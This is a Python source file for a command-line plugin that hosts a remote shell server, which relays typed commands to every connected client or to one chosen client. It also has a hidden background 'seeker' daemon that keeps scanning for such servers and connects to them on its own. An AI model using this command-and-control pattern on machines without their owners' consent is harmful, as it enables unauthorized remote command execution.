import socket
import sys
import threading

import click
from rich import print

from lash.plugins.spider.core import port_verify, run_web_client
from lash.plugins.spider.helpers import send_msg, recv_msg


@click.command("web", help="Remote web shell — host a server or connect as passive client")
@click.option("-h", "--host", "h", type=str, default=None,
              help="Host this machine. Pass port: -h 8080")
@click.option("-c", "--connect", "c", type=str, nargs=2, default=None,
              help="Connect passively to host. Pass IP and port: -c 192.168.1.1 8080")
def web(h, c):
    if h:
        host = socket.gethostbyname(socket.gethostname())
        try:
            port = port_verify(h)
        except ValueError as e:
            click.echo(str(e), err=True)
            sys.exit(1)
        _run_server(host, port)
    elif c:
        host_ip, port_str = c
        try:
            port = port_verify(port_str)
        except ValueError as e:
            click.echo(str(e), err=True)
            sys.exit(1)
        run_web_client(host_ip, port)
    else:
        click.echo("Error: pass -h <port> to host or -c <ip> <port> to connect", err=True)
        sys.exit(1)


def _run_server(host: str, port: int) -> None:
    clients: dict[str, socket.socket] = {}
    lock = threading.Lock()
    welcome = {"lash": "web"}

    def handle_client(conn: socket.socket, addr: str) -> None:
        with lock:
            clients[addr] = conn
        print(f"[green][connected][/green] {addr}")
        try:
            while True:
                msg = recv_msg(conn)
                if msg.get("type") == "result":
                    print(f"[cyan][{msg.get('addr', addr)}][/cyan] {msg['data']}", end="")
        except (ConnectionError, OSError):
            pass
        finally:
            with lock:
                clients.pop(addr, None)
            conn.close()
            print(f"[red][disconnected][/red] {addr}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen()
        print(f"[green]Server online[/green] [{host}:{port}] — waiting for connections...")

        def accept_loop() -> None:
            while True:
                try:
                    conn, (ip, p) = s.accept()
                    addr = f"{ip}:{p}"
                    send_msg(conn, welcome)
                    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
                except OSError:
                    break

        threading.Thread(target=accept_loop, daemon=True).start()

        while True:
            try:
                command = input().strip()
            except (KeyboardInterrupt, EOFError):
                break

            if not command:
                continue

            if command == "clients":
                with lock:
                    for addr in clients:
                        print(f"  {addr}")
                    if not clients:
                        print("No clients connected")
                continue

            if command == "kill":
                break

            target_addr = None
            if command.startswith("@"):
                parts = command.split(None, 1)
                if len(parts) == 2:
                    target_addr = parts[0][1:]
                    command = parts[1]

            msg = {"type": "cmd", "data": command}
            with lock:
                targets = (
                    {target_addr: clients[target_addr]}
                    if target_addr and target_addr in clients
                    else dict(clients)
                )
            for addr, conn in targets.items():
                try:
                    send_msg(conn, msg)
                except OSError:
                    pass


@click.command("seeker", help="Background daemon that auto-discovers and connects to Spider servers")
@click.argument("addresses", required=False)
@click.argument("ports", required=False)
@click.option("-s", "--stop", "do_stop", is_flag=True, help="Stop the running seeker")
@click.option("-p", "--ping", "ping_interval", default=10, type=int,
              help="Scan interval in seconds (default: 10)")
@click.option("--_daemon", "is_daemon", is_flag=True, hidden=True)
def seeker(addresses, ports, do_stop, ping_interval, is_daemon):
    from lash.plugins.spider.core import (
        read_pid, write_pid, is_pid_alive, spawn_daemon,
        stop_seeker as _stop_seeker, seeker_scan_loop,
    )
    import os

    if do_stop:
        click.echo(_stop_seeker())
        return

    if is_daemon:
        if not addresses or not ports:
            return
        write_pid(os.getpid())
        addr_list = [a.strip() for a in addresses.split(",")]
        port_list = [int(p.strip()) for p in ports.split(",")]
        seeker_scan_loop(addr_list, port_list, ping_interval)
        return

    if not addresses or not ports:
        click.echo("Error: ADDRESSES and PORTS required", err=True)
        sys.exit(1)

    pid = read_pid()
    if pid and is_pid_alive(pid):
        click.echo(f"Seeker already running (PID: {pid})")
        sys.exit(1)

    spawn_daemon(addresses, ports, ping_interval)
    click.echo("Seeker started")
